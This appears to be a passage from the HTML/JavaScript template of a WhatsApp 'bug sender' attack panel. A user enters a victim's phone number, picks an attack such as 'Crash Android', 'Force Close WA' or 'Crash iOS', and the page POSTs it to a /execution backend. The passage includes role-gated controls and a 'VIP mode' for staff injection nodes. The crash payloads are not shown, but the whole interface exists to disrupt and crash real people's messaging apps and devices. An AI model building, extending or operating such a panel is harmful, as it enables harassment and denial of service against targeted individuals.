            animation: fadeIn 0.8s ease-out;
        }

        /* ----- HEADER ----- */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 5px;
        }
        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1rem;
            font-weight: 700;
            letter-spacing: 1px;
            background: var(--neon-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header-btns {
            display: flex;
            gap: 15px;
            font-size: 1.2rem;
            color: var(--accent-purple);
        }

        /* ----- BANNER & PROFILE ----- */
        .banner-card {
            background: var(--surface-card);
            border-radius: 30px;
            overflow: hidden;
            border: 1px solid var(--border-neon);
            position: relative;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
            height: 280px;
            backdrop-filter: blur(10px);
        }
        .video-wrapper {
            width: 100%;
            height: 100%;
            background: #000;
            position: relative;
        }
        .video-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.4;
        }

        .profile-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 5;
            text-align: center;
            padding: 20px;
        }

        .avatar-main {
            width: 85px;
            height: 85px;
            border-radius: 50%;
            border: 2px solid var(--accent-purple);
            padding: 3px;
            background: rgba(0,0,0,0.5);
            margin-bottom: 12px;
            box-shadow: 0 0 20px var(--accent-glow);
        }
        .avatar-main img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .username-main {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            font-weight: 700;
            color: white;
            margin-bottom: 10px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }

        .badge-row {
            display: flex;
            gap: 8px;
            align-items: center;
        }

        .badge-role-main {
            background: rgba(188, 19, 254, 0.1);
            color: var(--accent-cyan);
            font-size: 9px;
            font-weight: 800;
            padding: 5px 12px;
            border-radius: 6px;
            border: 1px solid var(--accent-purple);
            text-transform: uppercase;
        }

        .badge-exp-main {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border-neon);
            color: var(--text-mute);
            font-size: 9px;
            font-weight: 600;
            padding: 5px 12px;
            border-radius: 6px;
        }

        /* ----- ACTIONS ----- */
        .action-row {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        .banner-btn {
            background: var(--btn-purple);
            border: 1px solid var(--border-neon);
            padding: 12px;
            border-radius: 15px;
            color: var(--accent-cyan);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.3s;
            text-align: center;
            text-decoration: none;
            flex: 1;
        }

        .banner-btn.active-vip {
            background: var(--accent-purple);
            color: white;
            box-shadow: 0 0 15px var(--accent-glow);
        }

        /* ----- PANEL CARD ----- */
        .panel-card {
            background: var(--surface-card);
            border-radius: 30px;
            padding: 25px;
            border: 1px solid var(--border-neon);
            display: flex;
            flex-direction: column;
            gap: 20px;
            backdrop-filter: blur(15px);
        }
        .panel-card h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.9rem;
            color: white;
            display: flex;
            align-items: center;
            gap: 10px;
            letter-spacing: 1px;
        }
        .panel-card h2::before {
            content: "";
            width: 3px;
            height: 15px;
            background: var(--accent-purple);
            border-radius: 10px;
            box-shadow: 0 0 10px var(--accent-purple);
        }

        .field-label { 
            color: var(--accent-cyan); 
            font-size: 0.75rem; 
            font-weight: 700;
            margin-bottom: 8px; 
            display: block; 
            text-transform: uppercase;
        }
        
        .input-box {
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border-neon);
            border-radius: 15px;
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: 0.3s;
        }
        .input-box:focus-within {
            border-color: var(--accent-purple);
            box-shadow: 0 0 10px rgba(188, 19, 254, 0.2);
        }
        .input-box input {
            background: transparent;
            border: none;
            color: #fff;
            width: 100%;
            outline: none;
            font-family: 'Plus Jakarta Sans', sans-serif;
            font-weight: 600;
        }

        .dropdown-trigger {
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border-neon);
            border-radius: 15px;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            color: #fff;
        }

        .bug-list {
            position: absolute; bottom: 115%; left: 0; right: 0;
            background: #0d061a; 
            border: 1px solid var(--accent-purple);
            border-radius: 20px; 
            display: none; 
            z-index: 100;
            max-height: 250px;
            overflow-y: auto;
            box-shadow: 0 -10px 30px rgba(0,0,0,0.5);
        }
        .bug-list.active { display: block; animation: slideUp 0.3s ease; }
        .bug-item { 
            padding: 15px; 
            border-bottom: 1px solid rgba(188, 19, 254, 0.1); 
            cursor: pointer; 
            display: flex;
            align-items: center;
            gap: 12px;
            transition: 0.2s;
        }
        .bug-item:hover { background: rgba(188, 19, 254, 0.1); }

        .send-btn {
            background: var(--neon-gradient);
            border: none;
            padding: 18px;
            border-radius: 18px;
            color: white;
            font-weight: 800;
            font-family: 'Orbitron', sans-serif;
            font-size: 0.85rem;
            cursor: pointer;
            width: 100%;
            letter-spacing: 2px;
            box-shadow: 0 5px 20px rgba(188, 19, 254, 0.3);
            transition: 0.3s;
        }
        .send-btn:hover {
            filter: brightness(1.1);
            transform: translateY(-2px);
        }

        /* ----- PROCESS OVERLAY ----- */
        .process-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(5, 1, 10, 0.95);
            display: none; flex-direction: column; align-items: center; justify-content: center;
            z-index: 2000; padding: 20px;
            backdrop-filter: blur(10px);
        }

        .process-card {
            width: 100%; max-width: 340px;
            background: #120821;
            border: 1px solid var(--accent-purple);
            border-radius: 25px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 0 40px var(--accent-glow);
        }

        .process-icon {
            color: var(--accent-cyan); font-size: 2.5rem; margin-bottom: 15px;
            filter: drop-shadow(0 0 10px var(--accent-cyan));
        }

        .process-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 14px; font-weight: 800; color: white;
            text-transform: uppercase; margin-bottom: 8px;
        }

        .progress-fill {
            width: 0%; height: 100%; background: var(--neon-gradient);
            box-shadow: 0 0 15px var(--accent-purple);
            transition: width 0.3s ease;
        }

        /* ----- MODALS ----- */
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 999;
            backdrop-filter: blur(8px);
        }
        .popup {
            background: #0d061a; border: 1px solid var(--accent-purple);
            border-radius: 25px; padding: 30px; width: 85%; max-width: 350px; text-align: center;
            box-shadow: 0 0 30px rgba(0,0,0,1);
        }
        .popup h3 { font-size: 14px; letter-spacing: 1px; }
        .popup button {
            background: var(--btn-purple); color: #fff; width: 100%; margin-top: 15px; padding: 14px; border-radius: 12px; font-weight: 700; border: 1px solid var(--accent-purple); cursor: pointer;
        }

        /* ----- NAVBAR ----- */
        .navbar {
            position: fixed; bottom: 15px; left: 50%; transform: translateX(-50%); 
            width: 90%; max-width: 400px;
            background: rgba(13, 6, 26, 0.85); 
            backdrop-filter: blur(25px);
            padding: 15px 10px;
            display: flex; justify-content: space-around;
            border-radius: 30px;
            border: 1px solid var(--border-neon);
            z-index: 200;
        }
        .nav-item {
            display: flex; flex-direction: column; align-items: center;
            color: var(--text-mute); text-decoration: none; font-size: 10px; gap: 6px;
        }
        .nav-item i { font-size: 1.3rem; }
        .nav-item.active { color: var(--accent-cyan); filter: drop-shadow(0 0 5px var(--accent-cyan)); }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="process-overlay" id="processOverlay">
        <div class="process-card">
            <div class="process-icon"><i class="fas fa-microchip"></i></div>
            <div class="process-title">SEND <span id="procBugName">PAYLOAD</span></div>
            <div style="font-size: 12px; color: var(--text-mute); margin-bottom: 20px;">Target: <span id="procTargetNum" style="color: var(--accent-cyan)">...</span></div>
            <div style="width: 100%; height: 6px; background: rgba(255,255,255,0.05); border-radius: 10px; overflow: hidden; margin-bottom: 15px; border: 1px solid rgba(188,19,254,0.2);">
                <div class="progress-fill" id="procBar"></div>
            </div>
            <div style="font-family: 'JetBrains Mono'; font-size: 10px; color: var(--accent-purple); letter-spacing: 1px;">PROSES SEND BUG...</div>
        </div>
    </div>

    <div class="container">
        <div class="header">
            <i class="fas fa-bars-staggered" style="color: var(--accent-purple); font-size: 1.2rem;"></i>
            <h1>Olaa, ${username}</h1>
            <div class="header-btns">
                <i class="far fa-bell"></i>
                <i class="far fa-user-circle"></i>
            </div>
        </div>

        <div class="banner-card">
            <div class="video-wrapper">
                <video id="bannerVideo" autoplay muted loop playsinline>
                    <source src="https://a.top4top.io/m_3707p89l31.mp4">
                </video>
                <div class="profile-overlay">
                    <div class="avatar-main">
                        <img src="https://c.top4top.io/p_3702h8pg51.jpg" alt="User">
                    </div>
                    <div class="username-main">${username}</div>
                    <div class="badge-row">
                        <div class="badge-role-main">${role}</div>
                        <div class="badge-exp-main"><i class="far fa-clock"></i> ${formattedTime}</div>
                    </div>
                </div>
                <div style="position: absolute; bottom: 15px; right: 15px; z-index: 10; cursor: pointer; opacity: 0.6;">
                    <i id="soundIcon" class="fas fa-volume-mute" style="color: white;"></i>
                </div>
            </div>
        </div>

        <div class="action-row">
            <div class="banner-btn" id="editBugBtn" style="display: none;">Edit Bug</div>
            <div class="banner-btn" id="modeVipBtn" style="display: none;">Mode Vip</div>
            <a href="/sender" class="banner-btn">Cek Sender</a>
        </div>

        <div class="panel-card">
            <h2>PANEL ATTACK</h2>
            
            <div>
                <span class="field-label">Target Numbers</span>
                <div class="input-box">
                    <i class="fas fa-mobile-alt" style="color: var(--accent-purple); font-size: 0.9rem;"></i>
                    <input type="text" id="numberInput" value="${data.target || ''}" placeholder="e.g. +628xxx">
                </div>
            </div>

            <div style="position: relative;">
                <span class="field-label">Bug Type</span>
                <div class="dropdown-trigger" id="menuToggle">
                    <span id="selectedBugLabel" style="font-weight: 600; font-size: 0.9rem;">SELECT BUG</span>
                    <i class="fas fa-chevron-down" style="font-size: 0.8rem; color: var(--accent-purple)"></i>
                </div>
                <div class="bug-list" id="bugDropdown"></div>
            </div>

            <button class="send-btn" id="executeBtn"> ATTACK</button>
        </div>
    </div>

    <div class="overlay" id="editModal">
        <div class="popup">
            <h3 style="color: white; margin-bottom: 20px; font-family: 'Orbitron'; color: var(--accent-cyan);">PAYLOAD CONFIG</h3>
            <div id="bugConfigList" style="text-align: left; margin-bottom: 20px;"></div>
            <button onclick="saveBugConfig()" style="background: var(--neon-gradient); border:none;">Update System</button>
            <button onclick="closeModal('editModal')" style="background:transparent; border: 1px solid rgba(255,255,255,0.1);">Close</button>
        </div>
    </div>

    <div class="overlay" id="customModal">
        <div class="popup">
            <div id="modalIcon" style="font-size: 3rem; margin-bottom: 15px;"></div>
            <h3 id="modalTitle" style="color: white; font-family: 'Orbitron'; margin-bottom: 10px;"></h3>
            <p id="modalMessage" style="color: var(--text-mute); font-size: 0.85rem; line-height: 1.5;"></p>
            <button onclick="closeModal('customModal')">ACCEPT!</button>
        </div>
    </div>

    <nav class="navbar">
        <a href="/dashboard" class="nav-item"><i class="fas fa-home"></i></a>
        <a href="/execution" class="nav-item active"><i class="fab fa-whatsapp"></i></a>
        <a href="/anime" class="nav-item"><i class="fas fa-film"></i></a>
        <a href="/sender" class="nav-item"><i class="fas fa-mobile-alt"></i></a>
    </nav>

    <script>
        // Logika script tetap sama secara fungsional, hanya menyesuaikan beberapa visual feedback
        const bugTypes = [
            { id: 'delay', icon: 'fab fa-android', title: 'Delay Invisible' },
            { id: 'crash', icon: 'fab fa-android', title: 'Crash Android' },
            { id: 'blank', icon: 'fab fa-android', title: 'Blank Android' },
            { id: 'fcandro', icon: 'fab fa-android', title: 'Force Close WA' },
            { id: 'crashios', icon: 'fab fa-apple', title: 'Crash iOS' },
            { id: 'fcios', icon: 'fab fa-apple', title: 'Force Close iOS' }
        ];

        const currentRole = "${role}".toLowerCase(); 
        let activeBugIds = JSON.parse(localStorage.getItem('activeBugs')) || ['delay', 'crash', 'blank', 'fcandro', 'crashios', 'fcios'];

        const bugDropdown = document.getElementById('bugDropdown');
        const menuToggle = document.getElementById('menuToggle');
        const selectedBugLabel = document.getElementById('selectedBugLabel');
        const executeBtn = document.getElementById('executeBtn');
        const bannerVideo = document.getElementById('bannerVideo');
        const soundIcon = document.getElementById('soundIcon');
        const editBugBtn = document.getElementById('editBugBtn');
        const modeVipBtn = document.getElementById('modeVipBtn');
        const processOverlay = document.getElementById('processOverlay');
        const procBar = document.getElementById('procBar');

        let selectedBugType = null;
        let selectedBugTitle = "";
        let isModeVip = false;

        function initRoleUI() {
            if (currentRole === 'owner') {
                editBugBtn.style.display = 'block';
                modeVipBtn.style.display = 'block';
            } else if (currentRole === 'admin') {
                modeVipBtn.style.display = 'block';
            }
        }

        function initBugList() {
            bugDropdown.innerHTML = '';
            const isVip = (currentRole === 'owner' || currentRole === 'admin');
            bugTypes.forEach(bug => {
                if (isVip || activeBugIds.includes(bug.id)) {
                    const item = document.createElement('div');
                    item.className = 'bug-item';
                    item.innerHTML = \`<i class="\${bug.icon}" style="color:var(--accent-purple); width:20px;"></i> <span style="color:white; font-weight:600; font-size:13px;">\${bug.title}</span>\`;
                    item.onclick = (e) => {
                        e.stopPropagation();
                        selectedBugType = bug.id;
                        selectedBugTitle = bug.title;
                        selectedBugLabel.innerText = bug.title;
                        bugDropdown.classList.remove('active');
                    };
                    bugDropdown.appendChild(item);
                }
            });
        }

        modeVipBtn.onclick = () => {
            isModeVip = !isModeVip;
            if (isModeVip) {
                modeVipBtn.classList.add('active-vip');
                modeVipBtn.innerText = 'VIP ENABLED';
                showPopup('success', 'VIP MODE', 'System will now use staff nodes for injection.');
            } else {
                modeVipBtn.classList.remove('active-vip');
                modeVipBtn.innerText = 'VIP Access';
                showPopup('error', 'VIP MODE', 'Reverting to personal nodes.');
            }
        };

        editBugBtn.onclick = () => {
            const list = document.getElementById('bugConfigList');
            list.innerHTML = '';
            bugTypes.forEach(bug => {
                const checked = activeBugIds.includes(bug.id) ? 'checked' : '';
                list.innerHTML += \`
                    <div style="display:flex; justify-content:space-between; align-items:center; padding:12px; border-bottom:1px solid rgba(255,255,255,0.05); color:white;">
                        <span style="font-size:13px;">\${bug.title}</span>
                        <input type="checkbox" value="\${bug.id}" \${checked} style="accent-color:var(--accent-purple); width:18px; height:18px;">
                    </div>\`;
            });
            document.getElementById('editModal').style.display = 'flex';
        };

        function saveBugConfig() {
            const checkboxes = document.querySelectorAll('#bugConfigList input');
            activeBugIds = Array.from(checkboxes).filter(i => i.checked).map(i => i.value);
            localStorage.setItem('activeBugs', JSON.stringify(activeBugIds));
            initBugList();
            closeModal('editModal');
        }

        soundIcon.onclick = () => {
            bannerVideo.muted = !bannerVideo.muted;
            soundIcon.className = bannerVideo.muted ? 'fas fa-volume-mute' : 'fas fa-volume-up';
        };

        menuToggle.onclick = (e) => {
            e.stopPropagation();
            bugDropdown.classList.toggle('active');
        };

        function showPopup(type, title, message) {
            const modal = document.getElementById('customModal');
            const icon = document.getElementById('modalIcon');
            icon.innerHTML = type === 'success' ? '<i class="fas fa-check-double" style="color:var(--accent-cyan)"></i>' : '<i class="fas fa-shield-virus" style="color:var(--danger)"></i>';
            document.getElementById('modalTitle').innerText = title;
            document.getElementById('modalMessage').innerHTML = message;
            modal.style.display = 'flex';
        }

        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        executeBtn.onclick = async function() {
            const num = document.getElementById('numberInput').value.trim();
            if (!num || !selectedBugType) {
                showPopup('error', 'ACCESS DENIED', 'Please provide target coordinates and select a payload.');
                return;
            }

            document.getElementById('procBugName').innerText = selectedBugTitle.toUpperCase();
            document.getElementById('procTargetNum').innerText = num;
            processOverlay.style.display = 'flex';
            
            let progress = 0;
            const progressInterval = setInterval(() => {
                if (progress < 95) {
                    progress += Math.floor(Math.random() * 8) + 1;
                    procBar.style.width = progress + '%';
                }
            }, 200);

            try {
                const res = await fetch('/execution', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target: num, mode: selectedBugType, vipMode: isModeVip })
                });
                
                const result = await res.json();
                clearInterval(progressInterval);
                procBar.style.width = '100%';

                setTimeout(() => {
                    processOverlay.style.display = 'none';
                    if (result.success) {
                        showPopup('success', 'ATTACK EXECUTED', \`Target \${num} has been successfully engaged with \${selectedBugTitle}.\`);
                    } else {
                        showPopup('error', 'EXECUTION FAILED', result.error || 'The system has encountered an external block.');
                    }
                }, 500);

            } catch (e) {
                clearInterval(progressInterval);
                processOverlay.style.display = 'none';
                showPopup('error', 'LINK BROKEN', 'Connection to the mainframe lost.');
            }
        };

        window.onclick = () => bugDropdown.classList.remove('active');
        document.addEventListener('DOMContentLoaded', () => {
            initRoleUI();
            initBugList();
        });
    </script>
</body>
</html>`;
};